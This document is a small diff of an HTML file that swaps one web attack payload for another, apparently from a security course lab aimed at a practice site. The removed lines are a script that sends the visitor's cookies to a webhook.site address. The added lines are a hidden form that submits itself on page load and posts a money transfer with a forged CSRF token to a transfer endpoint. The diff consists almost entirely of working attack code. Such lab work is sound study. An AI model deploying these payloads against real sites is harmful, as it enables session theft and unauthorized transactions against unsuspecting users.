@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-<script>
-  fetch('https://webhook.site/5a6aff69-95db-43f0-bda7-1d8516507c1a?c='+document.cookie)
-</script>
-</head>
+  <body onload="document.forms[0].submit()">
+    <form method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+      <input type="hidden" name="csrf_token" value="NjEyNA==">
+      <input type="hidden" name="username" value="z5358480">
+      <input type="hidden" name="amount" value="100">
+    </form>
+  </body>
 </html>
